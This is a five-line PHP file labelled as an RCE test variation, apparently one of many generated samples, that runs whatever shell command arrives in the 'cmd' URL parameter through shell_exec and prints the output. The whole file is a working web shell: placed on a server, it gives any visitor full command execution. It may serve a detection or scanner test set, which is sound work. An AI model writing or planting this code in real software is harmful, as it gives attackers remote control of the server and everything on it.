<?php
// RCE test variation #597
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>